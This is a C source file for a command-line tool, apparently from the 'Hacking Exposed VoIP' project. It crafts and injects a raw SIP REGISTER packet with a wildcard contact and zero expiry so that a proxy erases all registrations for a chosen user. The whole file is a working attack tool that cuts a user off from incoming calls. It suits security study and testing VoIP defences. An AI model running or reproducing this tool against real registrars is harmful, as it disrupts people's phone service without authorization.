//-------------------------------------------------------------------------------
//
// erase_registrations.c - Command line tool to transmit
//                         a SIP REGISTER request which erases all
//                         registrations for a UA.
//
//    Copyright (C) 2006  Mark D. Collier/Mark O'Brien
//
//    This program is free software; you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation; either version 2 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program; if not, write to the Free Software
//    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
//
//   Author: Mark D. Collier/Mark O'Brien - 02/24/2006  v1.0
//         www.securelogix.com - mark.collier@securelogix.com
//         www.hackingexposedvoip.com
//
//-------------------------------------------------------------------------------

#include "hack_library.h"
#include "erase_registrations.h"

int  main ( int argc, char *argv[] ) {

    signal ( SIGTERM, catch_signals );
    signal ( SIGINT, catch_signals  );

    if ( argc < 5 ) {
        usage ( );
    };

//
//  Parse the command line.
//

    while ( ( opt = getopt ( argc, argv, "v" ) ) != EOF) {
        switch ( opt ) {
            case 'v':
                bVerbose = true;                // Verbose option.
                break;
            case 'h':
            case '?':
                usage();                        // Usage.
                break;
        }
    }

//
//  getopt permutes the order of the parms in argv[] placing non-optional parms
//  at the end of argv. optind should be the index of the 1st mandatory non-optional
//  parm in argv[] and there must be exactly 7 non-optional mandatory parms:
//

    if ( optind != ( argc - 4 ) ) {
        usage ( );
    }

//
// Ethernet device.
//

    psDevice = argv[optind++];

//
//  Obtain source IP address from specified device interface.
//

    strcpy ( ifreq.ifr_ifrn.ifrn_name, psDevice );

    if ( ( sockfd = socket ( AF_INET, SOCK_DGRAM, IPPROTO_UDP ) ) < 0 ) {
        fprintf ( stderr,
                 "\nsocket - Couldn't allocate socket to obtain host IP addr\n" );
        CleanupAndExit ( EXIT_FAILURE );
    }

    if ( ioctl ( sockfd, SIOCGIFADDR, &ifreq ) != 0 ) {
        fprintf ( stderr,
                 "\nioctl - Couldn't read socket's IP address\n" );
        CleanupAndExit ( EXIT_FAILURE );
    }

    saptr       = (struct sockaddr_in *)&ifreq.ifr_addr;
    srcIPv4Addr = (unsigned int        )saptr->sin_addr.s_addr;

//
//  Create a dotted string version of the host's IP address.
//

    ipStr = (unsigned char *)&srcIPv4Addr;

    snprintf ( srcIPv4AddrDotted,
               15,
               "%hu.%hu.%hu.%hu",
               ipStr[0], ipStr[1], ipStr[2], ipStr[3] );

//
//  User/extension.
//

    psUser = argv[optind++];

//
//  The domain.
//

    psDomain = argv[optind++];
    psTempIPv4Addr = strdup ( psDomain );
    if ( Str2IP( psTempIPv4Addr, &domain ) != EXIT_SUCCESS ) {
        printf ( "\ndomain IPv4 addr invalid: %s\n",
                 psDomain );
        free( psTempIPv4Addr );
        usage ( );
    }
    
    free ( psTempIPv4Addr );
    psTempIPv4Addr = NULL;

//
//  Destination IP address. Str2IP returns the numeric IP address in network
//  byte order.
//

    psDestIPv4Addr = argv[optind++];
    psTempIPv4Addr = strdup ( psDestIPv4Addr );

    if ( Str2IP( psTempIPv4Addr, &destIPv4Addr ) != EXIT_SUCCESS ) {
        printf ( "\ndestination IPv4 addr invalid: %s\n",
                 psDestIPv4Addr );

        free( psTempIPv4Addr );
        usage ( );
    }
    snprintf ( destIPv4AddrDotted, 15, psDestIPv4Addr );

    free ( psTempIPv4Addr );
    psTempIPv4Addr = NULL;

//
//  Print summary of parms.
//

    printf ( "\n%s\n", __ERASE_REGISTRATIONS_VERSION );
    printf ( "%s\n",   __ERASE_REGISTRATIONS_DATE    );

    printf ( "\ntargeted UA@IPV4 Addr    = %s@%s", psUser,   destIPv4AddrDotted );
    printf ( "\nat proxy IPV4 Addr:port  = %s:%u", psDomain, destPort           );
    printf ( "\n" );

    if ( bVerbose ) {
        printf ( "\nVerbose mode" );
    }

//
//  Create random values for request.
//

    if ( ( psBranch = GetNextGuid() ) == NULL ) {
        printf ( "\nBranch ID failure\n" );
        CleanupAndExit ( EXIT_FAILURE );
    }

    if ( ( psFromTag = GetNextGuid() ) == NULL ) {
        printf ( "\nFrom Tag failure\n" );
        CleanupAndExit ( EXIT_FAILURE );
    }

    if ( ( psCallID = GetNextGuid() ) == NULL ) {
        printf ( "\nCall ID failure\n" );
        CleanupAndExit ( EXIT_FAILURE );
    }

//
//  Build the first part of the REGISTER request.
//

    sprintf ( sipPayload,
        "REGISTER sip:%s SIP/2.0\r\n"
        "Via: SIP/2.0/UDP %s;branch=%s\r\n"
        "From: %s <sip:%s@%s>;tag=%s\r\n"
        "To: <sip:%s@%s>\r\n",
        psDomain,

        destIPv4AddrDotted,
        psBranch,

        psUser,
        psUser,
        psDomain,
        psFromTag,

        psUser,
        psDomain );

//
//  Add Contact and other info.
//

    sprintf ( sipPayload + strlen ( sipPayload ),
        "Contact: *\r\n"
        "Supported: replaces\r\n"
        "Call-ID: %s\r\n"
        "CSeq: 100 REGISTER\r\n"
        "Expires: 0\r\n"
        "User-Agent: Hacker\r\n"
        "Max-Forwards: 16\r\n"
        "Allow: INVITE,ACK,CANCEL,BYE,NOTIFY,REFER,OPTIONS,INFO,SUBSCRIBE\r\n"
        "Content-Length: 0\r\n",
        psCallID );

//
//  Set size.
//

    sipPayloadSize = strlen ( sipPayload);

//
//  Initialize the library.  Root priviledges are required.
//

    l = libnet_init (
            LIBNET_RAW4,        // injection type
            psDevice,           // network interface
            errbuf );           // errbuf

    if ( l == NULL ) {
        fprintf ( stderr, "libnet_init() failed: %s", errbuf );
        CleanupAndExit ( EXIT_FAILURE );
    }

//
//  Build UDP packet.
//

    udp_tag = libnet_build_udp (
		srcPort,                        // source port
		destPort,                       // destination port
		LIBNET_UDP_H + sipPayloadSize,  // total UDP packet length
		0,                              // let libnet compute checksum
                (u_int8_t *) sipPayload,        // payload
                sipPayloadSize,                 // payload length
		l,                              // libnet handle
		udp_tag );                      // ptag - 0 = build new, !0 = reuse

    if ( udp_tag == -1 ) {
        printf ( "Can't build  UDP packet: %s\n", libnet_geterror( l ) );
        CleanupAndExit ( EXIT_FAILURE );
    }
    
    // 
    //  Note: libnet seems to have problems computing correct UDP checksums
    //             reliably. Since the UDP checksum is optional, it can be set to zeros
    //             (i.e. see the call to libnet_build_udp above) and a call to 
    //             libnet_toggle_checksum()  can be used to disable the checksum
    //             calculation by libnet
    //
    
    libnet_toggle_checksum ( l, udp_tag, LIBNET_OFF );

//
//  Build IP header.
//

    ipPacketSize = LIBNET_IPV4_H + LIBNET_UDP_H + sipPayloadSize;

    ip_tag = libnet_build_ipv4(
            ipPacketSize,               // size
            0,                          // ip tos
            0,                          // ip id
            0,                          // fragmentation bits
            64,                         // ttl
            IPPROTO_UDP,                // protocol
            0,                          // let libnet compute checksum
            srcIPv4Addr,                // source address
            domain,                     // destination address
            NULL,                       // payload
            0,                          // payload length
            l,                          // libnet context
            ip_tag );                   // ptag - 0 = build new, !0 = reuse
			
    if ( ip_tag == -1 ) {
        printf ( "Can't build IP header: %s\n", libnet_geterror( l ) );
        CleanupAndExit ( EXIT_FAILURE );
    }

//
//  Dump the packet if in verbose mode.
//

    if ( bVerbose ) {
        DumpPacket ( sipPayload, sipPayloadSize );
        printf ( "\n\nSIP PAYLOAD for packet:\n%s", sipPayload );
    }

//
//  Write the packet.
//

    bytesWritten = libnet_write( l );
    if ( bytesWritten == -1 ) {
        fprintf ( stderr, "Write error: %s\n", libnet_geterror( l ) );
        CleanupAndExit ( EXIT_FAILURE );
    }

//
//  Make sure the number of written bytes jives with what we expect.
//

    if ( bytesWritten < ipPacketSize ) {
        fprintf ( stderr,
                 "Write error: libnet only wrote %d of %d bytes",
                 bytesWritten,
                 ipPacketSize );

        CleanupAndExit ( EXIT_FAILURE );
    }

    CleanupAndExit ( EXIT_SUCCESS );

}  //  end main

//-----------------------------------------------------------------------------
//
// catch_signals ( )
//
// signal catcher and handler
//
//-----------------------------------------------------------------------------

void catch_signals ( int signo ) {
    switch ( signo ) {
        case	SIGINT:
        case	SIGTERM: {
            printf ( "\nexiting...\n" );
            CleanupAndExit ( EXIT_SUCCESS );
        }
    }
} // end catch_signals

//-----------------------------------------------------------------------------
//
// CleanupAndExit ( )
//
// Clean up and exit.
//
//-----------------------------------------------------------------------------

void CleanupAndExit ( int status ) {
    if ( sockfd > 0 ) {
        if ( bVerbose ) {
            printf ( "\nclosing socket\n" );
        }
        close ( sockfd );
    }

    if ( l ) {
        libnet_destroy ( l );
        l = NULL;
    }

    printf ( "\n" );

    exit ( status );
} // End CleanupAndExit

//-------------------------------------------------------------------------------
//
// usage ( )
//
// Display command line usage.
//
//-------------------------------------------------------------------------------

void usage ( ) {
    printf ( "\n%s", __ERASE_REGISTRATIONS_VERSION );
    printf ( "\n%s", __ERASE_REGISTRATIONS_DATE    );
    printf ( "\n Usage:"                                                             );
    printf ( "\n Mandatory -"                                                        );
    printf ( "\n\tinterface (e.g. eth0)"                                             );
    printf ( "\n\ttarget user (e.g. \"\" or john.doe or 5000 or \"1+210-555-1212\")" );
    printf ( "\n\tIPv4 addr of target domain (ddd.ddd.ddd.ddd)"                      );
    printf ( "\n\tIPv4 addr of target proxy/registrar (ddd.ddd.ddd.ddd)"             );
    printf ( "\n Optional -" );
    printf ( "\n\t-h help - print this usage" );
    printf ( "\n\t-v verbose output mode\n" );
    printf ( "\n" );

    exit ( EXIT_FAILURE );
}
